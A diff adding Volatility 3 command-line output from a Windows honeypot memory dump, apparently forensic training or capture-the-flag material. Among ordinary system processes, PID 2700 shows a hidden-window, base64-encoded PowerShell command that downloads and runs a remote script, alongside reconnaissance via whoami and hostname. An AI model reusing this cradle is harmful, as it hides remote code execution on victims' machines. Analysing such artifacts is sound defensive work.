@@ -1,0 +1,62 @@
+$ /opt/volatility3/vol.py -f honeypot.raw windows.cmdline.CmdLine
+Volatility 3 Framework 2.0.0
+Progress:  100.00               PDB scanning finished
+PID     Process Args
+
+4       System  Required memory at 0x10 is not valid (process exited?)
+236     smss.exe        \SystemRoot\System32\smss.exe
+308     csrss.exe       %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,12288,512 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16
+348     wininit.exe     wininit.exe
+360     csrss.exe       %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,12288,512 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16
+400     services.exe    C:\Windows\system32\services.exe
+408     lsass.exe       C:\Windows\system32\lsass.exe
+416     lsm.exe C:\Windows\system32\lsm.exe
+496     winlogon.exe    winlogon.exe
+572     svchost.exe     C:\Windows\system32\svchost.exe -k DcomLaunch
+636     VBoxService.ex  C:\Windows\System32\VBoxService.exe
+692     svchost.exe     C:\Windows\system32\svchost.exe -k RPCSS
+744     svchost.exe     C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted
+848     svchost.exe     C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted
+888     svchost.exe     C:\Windows\system32\svchost.exe -k netsvcs
+1012    svchost.exe     C:\Windows\system32\svchost.exe -k LocalService
+1084    svchost.exe     C:\Windows\system32\svchost.exe -k NetworkService
+1208    spoolsv.exe     C:\Windows\System32\spoolsv.exe
+1252    svchost.exe     C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork
+1376    vmicsvc.exe     C:\Windows\system32\vmicsvc.exe -feature Heartbeat
+1396    vmicsvc.exe     C:\Windows\system32\vmicsvc.exe -feature KvpExchange
+1432    vmicsvc.exe     C:\Windows\system32\vmicsvc.exe -feature Shutdown
+1440    taskhost.exe    "taskhost.exe"
+1504    vmicsvc.exe     C:\Windows\system32\vmicsvc.exe -feature TimeSync
+1532    dwm.exe "C:\Windows\system32\Dwm.exe"
+1540    vmicsvc.exe     C:\Windows\system32\vmicsvc.exe -feature VSS
+1556    explorer.exe    C:\Windows\Explorer.EXE
+1620    svchost.exe     C:\Windows\System32\svchost.exe -k utcsvc
+1716    VBoxTray.exe    "C:\Windows\System32\VBoxTray.exe"
+1872    cygrunsrv.exe   "C:\Program Files\OpenSSH\bin\cygrunsrv.exe"
+1956    wlms.exe        C:\Windows\system32\wlms\wlms.exe
+1612    cygrunsrv.exe   Required memory at 0x7ffd9010 is not valid (process exited?)
+1684    conhost.exe     \??\C:\Windows\system32\conhost.exe "-57088940168010838710243314093101560802089520680-1936804963-2081634044-598129742
+1676    sshd.exe        "C:\Program Files\OpenSSH\usr\sbin\sshd.exe"
+1800    sppsvc.exe      C:\Windows\system32\sppsvc.exe
+2080    svchost.exe     C:\Windows\system32\svchost.exe -k NetworkServiceNetworkRestricted
+2360    SearchIndexer.  C:\Windows\system32\SearchIndexer.exe /Embedding
+2440    SearchProtocol  "C:\Windows\system32\SearchProtocolHost.exe" Global\UsGthrFltPipeMssGthrPipe1_ Global\UsGthrCtrlFltPipeMssGthrPipe1 1 -2147483646 "Software\Microsoft\Windows Search" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)" "C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc" "DownLevelDaemon"
+2460    SearchFilterHo  "C:\Windows\system32\SearchFilterHost.exe" 0 504 508 516 65536 512
+2616    csrss.exe       %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,12288,512 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16
+2644    winlogon.exe    winlogon.exe
+2784    taskhost.exe    "taskhost.exe"
+2844    dwm.exe "C:\Windows\system32\Dwm.exe"
+2856    explorer.exe    C:\Windows\Explorer.EXE
+3108    regsvr32.exe    Required memory at 0x7ffd5010 is not valid (process exited?)
+3504    VBoxTray.exe    "C:\Windows\System32\VBoxTray.exe"
+3112    WmiPrvSE.exe    C:\Windows\system32\wbem\wmiprvse.exe
+3324    iexplore.exe    "C:\Program Files\Internet Explorer\iexplore.exe"
+3344    iexplore.exe    "C:\Program Files\Internet Explorer\iexplore.exe" SCODEF:3324 CREDAT:14337
+2700    powershell.exe  "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" /window hidden /e aQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAHcAaQBuAGQAbwB3AHMAbABpAHYAZQB1AHAAZABhAHQAZQByAC4AYwBvAG0ALwB1AHAAZABhAHQAZQAuAHAAcwAxACcAKQApAA==
+3732    conhost.exe     \??\C:\Windows\system32\conhost.exe "288449379-1457209856-1923954052-101100547-172367320720102786213404402731845854479
+4028    whoami.exe      Required memory at 0x7ffdf010 is not valid (process exited?)
+4036    HOSTNAME.EXE    Required memory at 0x7ffd7010 is not valid (process exited?)
+2924    DumpIt.exe      "C:\Users\Santa\Desktop\DumpIt.exe"
+2920    conhost.exe     \??\C:\Windows\system32\conhost.exe "280284285205075330588133904-110126809119471720131011406317-845024101-1158882802
+168     dllhost.exe     C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}
+
